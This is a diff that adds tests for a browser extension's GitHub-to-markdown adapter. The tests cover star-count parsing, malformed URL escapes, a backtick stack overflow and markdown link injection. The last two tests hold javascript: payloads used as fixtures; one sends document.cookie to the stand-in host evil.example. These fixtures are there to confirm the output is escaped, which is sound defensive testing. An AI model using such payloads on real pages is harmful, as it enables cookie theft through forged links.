@@ -143,3 +143,73 @@ test("a GitHub redesign that removes every hook falls back rather than emitting 
   assert.equal(out, null);
   assert.ok(g.MonoAdapters.lastWarnings().some((w) => /github declined/.test(w)));
 });
+
+test("a rounded star label is never read as an exact count", () => {
+  // "4.2k" used to have its non-digits stripped and land in meta as 42 — off
+  // by two orders of magnitude, and indistinguishable from a real count.
+  const cases = [
+    ["4.2k", 4200],
+    ["12k", 12000],
+    ["1.3m", 1300000],
+    ["4,182", 4182],
+    ["4182", 4182],
+  ];
+  for (const [label, expected] of cases) {
+    const html = fixture("github_repo.html").replace('title="4,182"', `title="${label}"`);
+    const out = run(REPO, html);
+    assert.equal(out.meta.stars, expected, `${label} should read as ${expected}`);
+    assert.match(out.markdown, new RegExp(`\\*\\*Stars:\\*\\* ${label.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`));
+  }
+});
+
+test("a star label that parses as nothing is recorded as nothing, not as a number", () => {
+  const html = fixture("github_repo.html").replace('title="4,182"', 'title="many"');
+  const out = run(REPO, html);
+  assert.equal(out.meta.stars, null, "an unparseable label must not invent a count");
+});
+
+test("a malformed percent escape in a repo path does not take match() down", () => {
+  const [ad] = g.MonoAdapters.all().filter((a) => a.name === "github");
+  const bare = g.MonoDomLite.parse("<html><body></body></html>");
+  // route() runs on every page the extension captures, via match().
+  for (const url of [
+    "https://github.com/%ZZ/repo",
+    "https://github.com/monoes/%E0%A4%A",
+    "https://github.com/monoes/mono-agent/blob/master/a%ZZb.go",
+    "https://example.test/%ZZ",
+  ]) {
+    assert.doesNotThrow(() => ad.match({ url, tree: bare }), url);
+  }
+});
+
+test("a file made of backtick runs does not overflow the argument stack", () => {
+  // Math.max(...array) throws RangeError past ~125k arguments, and a blob
+  // page is user-supplied bytes.
+  const source = "`".repeat(200000);
+  const html = `<html><body><textarea data-testid="read-only-cursor-text-area">${source}</textarea></body></html>`;
+  let out;
+  assert.doesNotThrow(() => {
+    out = run(BLOB, html);
+  });
+  assert.equal(out.meta.kind, "file");
+  assert.match(out.markdown, /^`{200001}go$/m, "the fence is longer than the longest run inside it");
+});
+
+test("markdown syntax smuggled through the URL cannot forge a link", () => {
+  // owner/repo/path come out of the URL and are percent-decoded, so they can
+  // carry any character at all.
+  const url =
+    "https://github.com/monoes/mono-agent/blob/master/a%5D%28javascript%3Afetch%28%27%2F%2Fevil.example%27%29%29.go";
+  const out = run(url, fixture("github_blob.html"));
+
+  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(javascript:/i);
+});
+
+test("a comment author cannot smuggle a link into its own heading", () => {
+  const html = fixture("github_pr.html").replaceAll(
+    ">adarenn<",
+    ">adarenn](javascript:fetch('//evil.example/'+document.cookie))<"
+  );
+  const out = run(PR, html);
+  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(javascript:/i);
+});
